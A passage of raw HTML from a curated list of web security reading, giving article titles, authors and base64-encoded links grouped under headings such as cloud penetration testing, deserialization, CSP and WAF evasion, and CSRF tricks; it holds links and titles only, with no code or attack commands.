data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ByZXNpZGVudGJlZWY=\">@presidentbeef</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2d1aWRlcy5ydWJ5b25yYWlscy5vcmcvc2VjdXJpdHkuaHRtbA==\">Official Rails Security Guide</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydWJ5b25yYWlscy5vcmcv\">Rails team</span>.</li>\n</ul>\n<p><a name=\"angularjs\"></a></p>\n<h3 id=\"angularjs\"><a class=\"anchor\" href=\"#angularjs\">#</a> AngularJS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cucG9ydHN3aWdnZXIubmV0LzIwMTYvMDEveHNzLXdpdGhvdXQtaHRtbC1jbGllbnQtc2lkZS10ZW1wbGF0ZS5odG1s\">XSS without HTML: Client-Side Template Injection with AngularJS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxvZ2dlci5jb20vcHJvZmlsZS8xMDg1NjE3ODUyNDgxMTU1MzQ3NQ==\">Gareth Heyes</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cucG9ydHN3aWdnZXIubmV0LzIwMTcvMDUvZG9tLWJhc2VkLWFuZ3VsYXJqcy1zYW5kYm94LWVzY2FwZXMuaHRtbA==\">DOM based Angular sandbox escapes</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nYXJldGhoZXllcw==\">@garethheyes</span></li>\n</ul>\n<p><a name=\"reactjs\"></a></p>\n<h3 id=\"reactjs\"><a class=\"anchor\" href=\"#reactjs\">#</a> ReactJS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RhbmxlYy5jb20vYmxvZy94c3MtdmlhLWEtc3Bvb2ZlZC1yZWFjdC1lbGVtZW50\">XSS via a spoofed React element</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2RhbmxlYy5jb20v\">Daniel LeCheminant</span>.</li>\n</ul>\n<p><a name=\"ssl-tls\"></a></p>\n<h3 id=\"ssltls\"><a class=\"anchor\" href=\"#ssltls\">#</a> SSL/TLS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXB0aXZlLmNvLnVrL2Jsb2cvdGxzLXNzbC1zZWN1cml0eS10ZXN0aW5nLw==\">SSL &amp; TLS Penetration Testing</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXB0aXZlLmNvLnVrLw==\">APTIVE</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hha2t5NTQvbXV0dWFsLXRscy1zc2w=\">Practical introduction to SSL/TLS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hha2t5NTQ=\">@Hakky54</span>.</li>\n</ul>\n<p><a name=\"webmail\"></a></p>\n<h3 id=\"webmail\"><a class=\"anchor\" href=\"#webmail\">#</a> Webmail</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21vdHRvaW4vU2VjUGFwZXIvYmxvYi9tYXN0ZXIvV2VibWFpbC1IYWNraW5nLnBkZg==\">Webmail-Hacking</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZjFuNGxseS8=\">千域千寻</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJpcHN0ZWNoLmNvbS8yMDE3L3doeS1tYWlsLWlzLWRhbmdlcm91cy1pbi1waHAv\">Why mail() is dangerous in PHP</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmlwc3RlY2guY29tLw==\">Robin Peraglie</span>.</li>\n</ul>\n<p><a name=\"nfs\"></a></p>\n<h3 id=\"nfs\"><a class=\"anchor\" href=\"#nfs\">#</a> NFS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0YWNhZGVteS53b3JkcHJlc3MuY29tLzIwMTcvMDkvMjAvbmZzLz90PTEmYW1wO2NuPVpteGxlR2xpYkdWZmNtVmpjMTh5JmFtcDtyZWZzcmM9ZW1haWwmYW1wO2lpZD1iMzQ0MjJjZTE1MTY0ZTk5YTE5M2ZlYTBjY2M3YTAyZiZhbXA7dWlkPTE5NTk2ODAzNTImYW1wO25pZD0yNDQrMjg5NDc2NjE2\">NFS | PENETRATION TESTING ACADEMY</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0YWNhZGVteS53b3JkcHJlc3MuY29tLw==\">PENETRATION ACADEMY</span>.</li>\n</ul>\n<p><a name=\"aws\"></a></p>\n<h3 id=\"aws\"><a class=\"anchor\" href=\"#aws\">#</a> AWS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaGlub3NlY3VyaXR5bGFicy5jb20vcGVuZXRyYXRpb24tdGVzdGluZy9wZW5ldHJhdGlvbi10ZXN0aW5nLWF3cy1zdG9yYWdlLw==\">PENETRATION TESTING AWS STORAGE: KICKING THE S3 BUCKET</span> - Written by Dwight Hohnstein from <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaGlub3NlY3VyaXR5bGFicy5jb20v\">Rhino Security Labs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydHVlc2VjdXJpdHkuY29tL2F3cy1wZW5ldHJhdGlvbi10ZXN0aW5nLXBhcnQtMS1zMy1idWNrZXRzLw==\">AWS PENETRATION TESTING PART 1. S3 BUCKETS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydHVlc2VjdXJpdHkuY29tLw==\">VirtueSecurity</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydHVlc2VjdXJpdHkuY29tL2F3cy1wZW5ldHJhdGlvbi10ZXN0aW5nLXBhcnQtMi1zMy1pYW0tZWMyLw==\">AWS PENETRATION TESTING PART 2. S3, IAM, EC2</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydHVlc2VjdXJpdHkuY29tLw==\">VirtueSecurity</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmYtc2VjdXJlLmNvbS9ibG9nL21pc2FkdmVudHVyZXMtaW4tYXdz\">Misadventures in AWS</span> - Written by Christian Demko</li>\n</ul>\n<p><a name=\"azure\"></a></p>\n<h3 id=\"azure\"><a class=\"anchor\" href=\"#azure\">#</a> Azure</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaGlub3NlY3VyaXR5bGFicy5jb20vY2xvdWQtc2VjdXJpdHkvY29tbW9uLWF6dXJlLXNlY3VyaXR5LXZ1bG5lcmFiaWxpdGllcy8=\">Common Azure Security Vulnerabilities and Misconfigurations</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9yaGlub2JlbmphbWlu\">@rhinobenjamin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaGlub3NlY3VyaXR5bGFicy5jb20vYXp1cmUvY2xvdWQtc2VjdXJpdHktcmlza3MtcGFydC0xLWF6dXJlLWNzdi1pbmplY3Rpb24tdnVsbmVyYWJpbGl0eS8=\">Cloud Security Risks (Part 1): Azure CSV Injection Vulnerability</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zcGVuZ2lldHo=\">@spengietz</span>.</li>\n</ul>\n<p><a name=\"fingerprint\"></a></p>\n<h3 id=\"fingerprint\"><a class=\"anchor\" href=\"#fingerprint\">#</a> Fingerprint</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvMTI3MjY2Lmh0bWw=\">浅谈 Web 客户端追踪</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hdXRob3IvYXJrdGVhbQ==\">arkteam</span>.</li>\n</ul>\n<p><a name=\"sub-domain-enumeration\"></a></p>\n<h3 id=\"sub-domain-enumeration\"><a class=\"anchor\" href=\"#sub-domain-enumeration\">#</a> Sub Domain Enumeration</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFwcHNlY2NvLmNvbS9hLXBlbmV0cmF0aW9uLXRlc3RlcnMtZ3VpZGUtdG8tc3ViLWRvbWFpbi1lbnVtZXJhdGlvbi03ZDg0MmQ1NTcwZjY=\">A penetration tester’s guide to sub-domain enumeration</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFwcHNlY2NvLmNvbS9AeWFtYWtpcmFf\">Bharath</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN3ZWVwYXRpYy5jb20vYXJ0LW9mLXN1YmRvbWFpbi1lbnVtZXJhdGlvbi8=\">The Art of Subdomain Enumeration</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN3ZWVwYXRpYy5jb20vYXV0aG9yL3BhdHJpay8=\">Patrik Hudak</span>.</li>\n</ul>\n<p><a name=\"crypto\"></a></p>\n<h3 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZXR0ZXJjcnlwdG8ub3JnLw==\">Applied Crypto Hardening</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZXR0ZXJjcnlwdG8ub3JnLw==\">The bettercrypto.org Team</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3Nvb25saW5lLmNvbS9hcnRpY2xlLzMzODg2NDcvd2hhdC1pcy1hLXNpZGUtY2hhbm5lbC1hdHRhY2staG93LXRoZXNlLWVuZC1ydW5zLWFyb3VuZC1lbmNyeXB0aW9uLXB1dC1ldmVyeW9uZS1hdC1yaXNrLmh0bWw=\">What is a Side-Channel Attack ?</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3Nvb25saW5lLmNvbS9hdXRob3IvSi5NLi1Qb3J1cC8=\">J.M Porup</span>.</li>\n</ul>\n<p><a name=\"web-shell\"></a></p>\n<h3 id=\"web-shell\"><a class=\"anchor\" href=\"#web-shell\">#</a> Web Shell</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGVuYWJsZS5jb20vYmxvZy9odW50aW5nLWZvci13ZWItc2hlbGxz\">Hunting for Web Shells</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGVuYWJsZS5jb20vcHJvZmlsZS9qYWNvYi1iYWluZXM=\">Jacob Baines</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vaGFja2luZy13aXRoLWpzcC1zaGVsbHMv\">Hacking with JSP Shells</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9fbnVsbGJpbmQ=\">@_nullbind</span>.</li>\n</ul>\n<p><a name=\"osint\"></a></p>\n<h3 id=\"osint\"><a class=\"anchor\" href=\"#osint\">#</a> OSINT</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BzM3lmdWxsYWgvaGFja2luZy1jcnlwdG9jdXJyZW5jeS1taW5lcnMtd2l0aC1vc2ludC10ZWNobmlxdWVzLTY3N2JiYjNlMDE1Nw==\">Hacking Cryptocurrency Miners with OSINT Techniques</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BzM3lmdWxsYWg=\">@s3yfullah</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbWlhb3NraS9vc2ludC14LXVjY3Utd29ya3Nob3Atb24tb3Blbi1zb3VyY2UtaW50ZWxsaWdlbmNl\">OSINT x UCCU Workshop on Open Source Intelligence</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbWlhb3NraQ==\">Philippe Lin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1memQzemtBSV9vNA==\">102 Deep Dive in the Dark Web OSINT Style Kirby Plessas</span> - Presented by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9raXJic3Ry\">@kirbstr</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmx1cmJpei5pby9ibG9nL3RoZS1tb3N0LWNvbXBsZXRlLWd1aWRlLXRvLWZpbmRpbmctYW55b25lcy1lbWFpbA==\">The most complete guide to finding anyone’s email</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmx1cmJpei5pby8=\">Timur Daudpota</span>.</li>\n</ul>\n<p><a name=\"dns-rebinding\"></a></p>\n<h3 id=\"dns-rebinding\"><a class=\"anchor\" href=\"#dns-rebinding\">#</a> DNS Rebinding</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BicmFubm9uZG9yc2V5L2F0dGFja2luZy1wcml2YXRlLW5ldHdvcmtzLWZyb20tdGhlLWludGVybmV0LXdpdGgtZG5zLXJlYmluZGluZy1lYTcwOThhMmQzMjU=\">Attacking Private Networks from the Internet with DNS Rebinding</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BicmFubm9uZG9yc2V5\">@brannondorsey</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0ByYWRla2svaGFja2Vycy1jYW4tZ2V0LWFjY2Vzcy10by15b3VyLWhvbWUtcm91dGVyLTFkZGFkZDEyYTdhNw==\">Hacking home routers from the Internet</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0ByYWRla2s=\">@radekk</span></li>\n</ul>\n<p><a name=\"deserialization\"></a></p>\n<h3 id=\"deserialization\"><a class=\"anchor\" href=\"#deserialization\">#</a> Deserialization</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3hnbG92ZXNlY3VyaXR5LmNvbS8yMDE1LzExLzA2L3doYXQtZG8td2VibG9naWMtd2Vic3BoZXJlLWpib3NzLWplbmtpbnMtb3Blbm5tcy1hbmQteW91ci1hcHBsaWNhdGlvbi1oYXZlLWluLWNvbW1vbi10aGlzLXZ1bG5lcmFiaWxpdHkv\">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9icmVlbm1hY2hpbmU=\">@breenmachine</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0l2YW4xZWUvTkVULURlc2VyaWFsaXpl\">总结了十篇.Net 反序列化文章，持续更新</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0l2YW4xZWU=\">@Ivan1ee</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1lRGZHcHUzaUU0UQ==\">Attacking .NET deserialization</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9wd250ZXN0ZXI=\">@pwntester</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj0tLTZQaXV2QkdBVQ==\">.NET Roulette: Exploiting Insecure Deserialization in Telerik UI</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ub3BlcmF0b3I=\">@noperator</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0LXRvb2xzLmNvbS9ibG9nL2V4cGxvaXQtZG90bmV0bnVrZS1jb29raWUtZGVzZXJpYWxpemF0aW9uLw==\">How to exploit the DotNetNuke Cookie Deserialization</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0LXRvb2xzLmNvbS9ibG9nL2F1dGhvci9wZW50ZXN0LWNyaXN0aWFuLw==\">CRISTIAN CORNEA</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3luYWNrdGl2LmNvbS9lbi9wdWJsaWNhdGlvbnMvaG93LXRvLWV4cGxvaXQtbGlmZXJheS1jdmUtMjAyMC03OTYxLXF1aWNrLWpvdXJuZXktdG8tcG9jLmh0bWw=\">HOW TO EXPLOIT LIFERAY CVE-2020-7961 : QUICK JOURNEY TO POC</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zeW5hY2t0aXY=\">@synacktiv</span>.</li>\n</ul>\n<p><a name=\"oauth\"></a></p>\n<h3 id=\"oauth\"><a class=\"anchor\" href=\"#oauth\">#</a> OAuth</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcmFnbWF0aWN3ZWJzZWN1cml0eS5jb20vY291cnNlcy9pbnRyb2R1Y3Rpb24tb2F1dGgtb2lkYy5odG1s\">Introduction to OAuth 2.0 and OpenID Connect</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9QaGlsaXBwZURlUnljaw==\">@PhilippeDeRyck</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY3VyaW5nL3doYXQtaXMtZ29pbmctb24td2l0aC1vYXV0aC0yLTAtYW5kLXdoeS15b3Utc2hvdWxkLW5vdC11c2UtaXQtZm9yLWF1dGhlbnRpY2F0aW9uLTVmNDc1OTdiMjYxMQ==\">What is going on with OAuth 2.0? And why you should not use it for authentication.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BkYW1pYW5ydXNpbmVr\">@damianrusinek</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BqdXN0aW5sZWVfNzg1NjMvJUU5JTk3JTlDJUU2JTk2JUJDb2F1dGgtMi0wLSVFNCVCQiVBNWZhY2Vib29rJUU3JTgyJUJBJUU0JUJFJThCLTZmNzhhNGE1NWY1Mg==\">關於 OAuth 2.0 - 以 Facebook 為例</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BqdXN0aW5sZWVfNzg1NjM=\">@justinlee_78563</span>.</li>\n</ul>\n<p><a name=\"jwt\"></a></p>\n<h3 id=\"jwt\"><a class=\"anchor\" href=\"#jwt\">#</a> JWT</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yMmMuZGV2L2Jsb2cvMjAyMC9oYXJkY29kZWQtc2VjcmV0cy11bnZlcmlmaWVkLXRva2Vucy1hbmQtb3RoZXItY29tbW9uLWp3dC1taXN0YWtlcy8=\">Hardcoded secrets, unverified tokens, and other common JWT mistakes</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9lcm1pbDB2\">@ermil0v</span>.</li>\n</ul>\n<h2 id=\"evasions\"><a class=\"anchor\" href=\"#evasions\">#</a> Evasions</h2>\n<p><a name=\"evasions-xxe\"></a></p>\n<h3 id=\"xxe\"><a class=\"anchor\" href=\"#xxe\">#</a> XXE</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9TcGlkZXJTZWMvc3RhdHVzLzExOTEzNzU0NzI2OTA1MjgyNTY=\">Bypass Fix of OOB XXE Using Different encoding</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9TcGlkZXJTZWM=\">@SpiderSec</span>.</li>\n</ul>\n<p><a name=\"evasions-csp\"></a></p>\n<h3 id=\"csp\"><a class=\"anchor\" href=\"#csp\">#</a> CSP</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3czYy93ZWJhcHBzZWMtY3NwL2lzc3Vlcy8yNDM=\">Any protection against dynamic module import?</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Ac2hobmpr\">@shhnjk</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmRldGVjdGlmeS5jb20vMjAxNi8wNC8wNC9jc3AtYnlwYXNzaW5nLWZvcm0tYWN0aW9uLXdpdGgtcmVmbGVjdGVkLXhzcy8=\">CSP: bypassing form-action with reflected XSS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmRldGVjdGlmeS5jb20v\">Detectify Labs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wYXVsb3N5aWJlbG8uY29tLzIwMTcvMDUvdHdpdHRlci14c3MtY3NwLWJ5cGFzcy5odG1s\">TWITTER XSS + CSP BYPASS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wYXVsb3N5aWJlbG8uY29tLw==\">Paulos Yibelo</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWIud2FsbGFybS5jb20vaG93LXRvLXRyaWNrLWNzcC1pbi1sZXR0aW5nLXlvdS1ydW4td2hhdGV2ZXIteW91LXdhbnQtNzNjYjVmZjQyOGFh\">Neatly bypassing CSP</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxsYXJtLmNvbS8=\">Wallarm</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ldmFkaW5nLWNzcC13aXRoLWRvbS1iYXNlZC1kYW5nbGluZy1tYXJrdXA=\">Evading CSP with DOM-based dangling markup</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">portswigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWJlbmdpbmVlcmluZy5jb20vZ2l0aHVicy1jc3Atam91cm5leS8=\">GitHub's CSP journey</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B0b29tZXkz\">@ptoomey3</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWJlbmdpbmVlcmluZy5jb20vZ2l0aHVicy1wb3N0LWNzcC1qb3VybmV5Lw==\">GitHub's post-CSP journey</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B0b29tZXkz\">@ptoomey3</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2hlYXJ0c2t5LmluZm8vMjAxNy8wMy8wMy8lRTklODIlQTMlRTQlQkElOUIlRTUlQjklQjQlRTYlODglOTElRTQlQkIlQUMlRTclQkIlOTUlRTglQkYlODclRTclOUElODRDU1A=\">那些年我们绕过的 CSP</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2hlYXJ0c2t5LmluZm8v\">HeartSky</span>.</li>\n</ul>\n<p><a name=\"evasions-waf\"></a></p>\n<h3 id=\"waf\"><a class=\"anchor\" href=\"#waf\">#</a> WAF</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3dhZi1ldmFzaW9uLXRlY2huaXF1ZXMtNzE4MDI2ZDY5M2Q4\">Web Application Firewall (WAF) Evasion Techniques</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zZWNqdWljZQ==\">@secjuice</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3NlY2p1aWNlL3dlYi1hcHBsaWNhdGlvbi1maXJld2FsbC13YWYtZXZhc2lvbi10ZWNobmlxdWVzLTItMTI1OTk1ZjNlN2Iw\">Web Application Firewall (WAF) Evasion Techniques #2</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zZWNqdWljZQ==\">@secjuice</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94aWFuemhpLmFsaXl1bi5jb20vZm9ydW0vcmVhZC81NTMuaHRtbA==\">浅谈 json 参数解析对 waf 绕过的影响</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly94aWFuemhpLmFsaXl1bi5jb20vZm9ydW0vdS5waHA/dWlkPTE3MjM4OTU3Mzc1MzE0Mzc=\">doggy</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idWVyLmhhdXMvMjAxNy8wMy8wOC9haXJibmItd2hlbi1ieXBhc3NpbmctanNvbi1lbmNvZGluZy14c3MtZmlsdGVyLXdhZi1jc3AtYW5kLWF1ZGl0b3ItdHVybnMtaW50by1laWdodC12dWxuZXJhYmlsaXRpZXMv\">Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9iYnVlcmhhdXM=\">@Brett Buerhaus</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BkMHpucHAvaG93LXRvLWJ5cGFzcy1saWJpbmplY3Rpb24taW4tbWFueS13YWYtbmd3YWYtMWUyNTEzNDUzYzBm\">How to bypass libinjection in many WAF/NGWAF</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BkMHpucHA=\">@d0znpp</span>.</li>\n</ul>\n<p><a name=\"evasions-jsmvc\"></a></p>\n<h3 id=\"jsmvc\"><a class=\"anchor\" href=\"#jsmvc\">#</a> JSMVC</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpby9qc212Y29tZmctdG8tc3Rlcm5seS1sb29rLWF0LWphdmFzY3JpcHQtbXZjLWFuZC10ZW1wbGF0aW5nLWZyYW1ld29ya3M=\">JavaScript MVC and Templating Frameworks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpbw==\">Mario Heiderich</span>.</li>\n</ul>\n<p><a name=\"evasions-authentication\"></a></p>\n<h3 id=\"authentication\"><a class=\"anchor\" href=\"#authentication\">#</a> Authentication</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubWFsZXJpc2NoLm5ldC8yMDE3LzA0L3RyZW5kLW1pY3JvLXRocmVhdC1kaXNjb3ZlcnktYXBwbGlhbmNlLXNlc3Npb24tZ2VuZXJhdGlvbi1hdXRoZW50aWNhdGlvbi1ieXBhc3MtY3ZlLTIwMTYtODU4NC5odG1s\">Trend Micro Threat Discovery Appliance - Session Generation Authentication Bypass (CVE-2016-8584)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9tYWxlcmlzY2g=\">@malerisch</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zdGV2ZW50c2VlbGV5\">@steventseeley</span>.</li>\n</ul>\n<h2 id=\"tricks\"><a class=\"anchor\" href=\"#tricks\">#</a> Tricks</h2>\n<p><a name=\"tricks-csrf\"></a></p>\n<h3 id=\"csrf\"><a class=\"anchor\" href=\"#csrf\">#</a> CSRF</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMjcxNjE4MQ==\">Neat tricks to bypass CSRF-protection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d29zZWN1cml0eS5pby8=\">Twosecurity</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFwcHNlY2NvLmNvbS9leHBsb2l0aW5nLWNzcmYtb24tanNvbi1lbmRwb2ludHMtd2l0aC1mbGFzaC1hbmQtcmVkaXJlY3RzLTY4MWQ0YWQ2YjMxYg==\">Exploiting CSRF on JSON endpoints with Flash and redirects</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFwcHNlY2NvLmNvbS9Acml5YXp3YWxpa2Fy\">@riyazwalikar</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2R4YTQ0ODEvY3NzSW5qZWN0aW9u\">Stealing CSRF tokens with CSS injection (without iFrames)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2R4YTQ0ODE=\">@dxa4481</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnNlY3VyaXR5ZXZhbHVhdG9ycy5jb20vY3JhY2tpbmctamF2YXMtcm5nLWZvci1jc3JmLWVhOWNhY2QyMzFkMg==\">Cracking Java’s RNG for CSRF - Javax Faces and Why CSRF Token Randomness Matters</span> - Written by <span class=\"exturl\" 